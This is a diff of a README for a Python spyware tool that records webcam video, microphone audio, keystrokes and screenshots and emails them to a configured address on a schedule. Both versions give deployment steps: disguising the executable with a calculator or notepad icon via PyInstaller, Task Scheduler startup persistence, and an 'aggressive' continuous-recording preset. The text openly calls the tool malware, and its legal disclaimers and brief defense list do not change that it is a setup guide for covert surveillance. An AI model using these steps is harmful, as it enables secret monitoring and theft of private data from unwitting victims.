@@ -1,193 +1,129 @@
-#Spyware 
+🔴  Hypocritespy 
+A Python-based surveillance utility Built with ❤️, ☕, and controlled chaos by Ronny Rogers (Mugabo Rongin)
 
-⚠️ WARNING: LEGAL AND ETHICAL DISCLAIMER
-This software is provided for EDUCATIONAL PURPOSES ONLY.
-Creating, distributing, or using spyware without explicit permission from the target device owner is ILLEGAL in most jurisdictions and violates privacy laws. Unauthorized surveillance can result in severe criminal penalties, civil lawsuits, and ethical violations.
+⚠️ WARNING: This tool is for LEGITIMATE SECURITY TESTING ONLY on devices you own or have explicit permission to monitor. Unauthorized use violates privacy laws globally.
 
-You must only use this software:
+🎯 What Does It Do?
+This toolkit captures system activity through multiple vectors:
 
-On devices you own
+🎥 Webcam Recording – Captures video from default camera
 
-With explicit consent from the owner
+🎤 Microphone Recording – Grabs ambient audio
 
-In legally compliant environments (e.g., penetration testing with authorization, monitoring your own minor children within legal limits)
+⌨️ Keylogging – Tracks all keyboard inputs
 
-For learning about cybersecurity defense mechanisms
+🖼️ Screenshots – Takes periodic screen captures
 
-The author assumes NO liability for misuse of this code.
+Default behavior: Records 10 minutes every 3 hours → emails data → repeats.
 
-Spyware – Surveillance Tool (Educational)
-A Python-based surveillance tool that captures system activity including webcam footage, microphone audio, keystrokes, and screenshots. By default, it records for 10 minutes every 3 hours and sends the collected data to a configured email address.
-
-🛡️ Legal & Ethical Use Cases
-Authorized penetration testing
-
-Parental control (with full disclosure to monitored individuals where required by law)
-
-Employee monitoring (where legally permitted and with prior written consent)
-
-Personal device security research
-
-✨ Features
-Webcam Recording – Captures video from the default webcam
-
-Microphone Recording – Records ambient audio
-
-Keylogging – Logs all keyboard inputs
-
-Screenshot Capture – Takes periodic screenshots
-
-Automated Email Reporting – Sends collected data via email
-
-Configurable Scheduling – Adjust recording duration and frequency
-
-Stealth Operation – Can be configured to run silently on system startup
-
-⚙️ Prerequisites
-Python 3.8+
-
-Required libraries (install via requirements.txt):
-
-opencv-python
-
-pyaudio
-
-pynput
-
-pillow
-
-smtplib (standard library)
-
-email (standard library)
-
-🔧 Installation & Setup
-Clone the repository
-
-bash
-git clone https://github.com/yourusername/spyware-educational.git
-cd spyware-educational
-Install dependencies
-
-bash
-pip install -r requirements.txt
-Configure the application
-
-⚠️ CRITICAL: You MUST modify the following before use:
-
-Open config.py (or relevant configuration files)
-
-Replace the email credentials:
+🛠️ Quick Setup
+1. 🔧 Edit These 4 Things
+Open the code files and replace:
 
 python
-# REMOVE THESE LINES AND INSERT YOUR OWN
-SENDER_EMAIL = "your_email@gmail.com"
-SENDER_PASSWORD = "your_app_password"  # Use app-specific password
-RECIPIENT_EMAIL = "recipient_email@gmail.com"
-Adjust surveillance settings:
+# Your email (remove the existing one)
+YOUR_EMAIL = "your_email@gmail.com"
 
-python
-# Example configuration
-RECORDING_DURATION = 600  # 10 minutes in seconds
-INTERVAL_BETWEEN_SESSIONS = 10800  # 3 hours in seconds
-ENABLE_KEYLOGGING = True
-ENABLE_SCREENSHOTS = True
-ENABLE_WEBCAM = True
-ENABLE_MICROPHONE = True
-Email Configuration Notes
+# Your app password (not regular password!)
+APP_PASSWORD = "your_app_specific_password"
 
-For Gmail, enable 2FA and generate an App Password
+# Recipient email
+RECIPIENT = "receiver@gmail.com"
 
-Use secure email providers with encryption
-
-Consider using encrypted email services for sensitive data
-
-🚀 Deployment (For Authorized Use Only)
-Creating an Executable
-To create a seemingly harmless executable:
-
-Find an appropriate icon (e.g., notepad.ico or calculator.ico)
-
-Use PyInstaller:
+# Timing settings (adjust as needed)
+RECORD_DURATION = 600    # Seconds (10 minutes default)
+INTERVAL = 10800         # Seconds between sessions (3 hours default)
+2. 📦 Build the Executable
+Make it look innocent:
 
 bash
-pyinstaller --onefile --windowed --icon=harmless.ico main.py
-The executable will be in the dist/ folder
+# Get a harmless icon (calculator.ico, notepad.ico, etc.)
+pyinstaller --onefile --windowed --icon=calculator.ico main.py
+3. ⚡ Ensure Startup Execution
+For 100% reliability, use Task Scheduler to trigger on startup/logon.
 
-Startup Persistence
-By default, the code attempts to run on startup, but for 100% reliability:
+🎨 Customization Options
+Timing Presets
+python
+# Quick monitoring (1 min every hour)
+RECORD_DURATION = 60
+INTERVAL = 3600
 
-Using Task Scheduler (Windows):
+# Aggressive monitoring (continuous)
+RECORD_DURATION = 86400  # 24 hours
+INTERVAL = 1             # Immediate repeat
+Feature Toggles
+Enable/disable specific modules in the configuration.
 
-Open Task Scheduler
+⚠️ Critical Notes
+🚫 Antivirus will flag this as malware (because it is)
 
-Create Basic Task
+📧 Use app passwords, not your real email password
 
-Trigger: "At startup" or "At logon"
+🔒 Test in isolated VMs only
 
-Action: "Start a program"
+⚖️ Check local laws before deployment
 
-Browse to your executable
+👁️ Always get written consent when monitoring others
 
-Run with highest privileges
+🛡️ Defense Against Such Tools
+To protect systems from unauthorized surveillance:
 
-⚠️ Important Security Notes
-Antivirus Detection: Most antivirus software will flag this as malware
+🛡️ Use reputable antivirus software
 
-Network Monitoring: Email transmission may be detected by network security tools
+🔍 Monitor startup programs regularly
 
-Legal Requirements: Many jurisdictions require notification of surveillance
+🌐 Check outgoing network connections
 
-Data Protection: Collected data may contain sensitive information subject to GDPR, CCPA, etc.
+📋 Review Task Scheduler entries
 
-🔒 Defensive Measures (For System Protection)
-To detect and prevent such software on your systems:
+🎯 Use webcam privacy covers
 
-Use reputable antivirus/anti-malware solutions
+📚 Legitimate Use Cases
+✅ Parental control (with child's knowledge where required)
 
-Monitor startup programs and scheduled tasks
+✅ Employee monitoring (with written consent & legal compliance)
 
-Use firewall to block suspicious outbound connections
+✅ Personal device security research
 
-Regularly audit running processes
+✅ Authorized penetration testing
 
-Employ endpoint detection and response (EDR) tools
+✅ Educational cybersecurity studies
 
-🧪 Testing in Safe Environments
-For legitimate testing:
+🚫 Illegal Uses
+❌ Monitoring without consent
 
-Use isolated virtual machines
+❌ Spying on partners/friends/family
 
-Test only on devices you own
+❌ Corporate espionage
 
-Disable network connectivity during testing
+❌ Any unauthorized surveillance
 
-Use test email accounts
+⚖️ Legal Disclaimer
+By using this software, you agree that:
 
-📝 License
-This project is licensed under the MIT License with additional ethical use clauses:
+You will only use it legally and ethically
 
-Use only for legal, authorized purposes
+You accept full responsibility for your actions
 
-Not for use in unauthorized surveillance
+The developer is not liable for misuse
 
-Developer not liable for misuse
+You understand the potential legal consequences of unauthorized use
 
-🙋‍♂️ Responsible Disclosure
-If you find vulnerabilities in similar software, report them responsibly to:
+📞 More info
+[For educational inquiries only](https://ronny12345-art.github.io/ronnyrogers.dev/
 
-Software vendors
+👤 Author
 
-CERT/CC
+Ronny Rogers 💻 Developer | 🛡️ Cyber security specialist | ⚡ Pentester)
 
-Relevant security organizations
+Purpose: Learning about surveillance detection
 
-📚 Educational Resources
-Electronic Frontier Foundation: Surveillance Self-Defense
+Goal: Improving defensive security measures
 
-US Laws on Computer Fraud and Abuse
+Ethics: Always prioritize privacy and consent
 
-EU General Data Protection Regulation (GDPR)
+🔐 Remember: True power in cybersecurity comes from protection, not intrusion. Use this knowledge to build better defenses, not to breach them.
 
-Developed by Ronny Rogers( Mugabo Rongin)
+Version: 1.0 | For Educational Purposes Only | Use Responsibly
 
-Remember: With great power comes great responsibility. Use this knowledge to protect, not to harm.
